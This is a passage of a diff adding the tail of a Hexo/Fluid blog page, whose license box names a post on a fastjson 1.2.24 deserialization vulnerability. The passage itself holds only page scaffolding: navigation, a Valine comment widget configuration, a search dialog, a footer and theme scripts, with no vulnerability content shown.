+    <div class="license-title">
+      <div></div>
+      <div>http://example.com/2023/07/06/fastjson 1.2.24 反序列化导致任意命令执行漏洞/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>QwQ0QwQ</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月6日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/07/06/hello-world/" title="Hello World">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"SeYWUaxob5NvOeVcArETF3JO-gzGzoHsz","appKey":"5irVcutGGTJFLtJ9dXXA9SNn","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
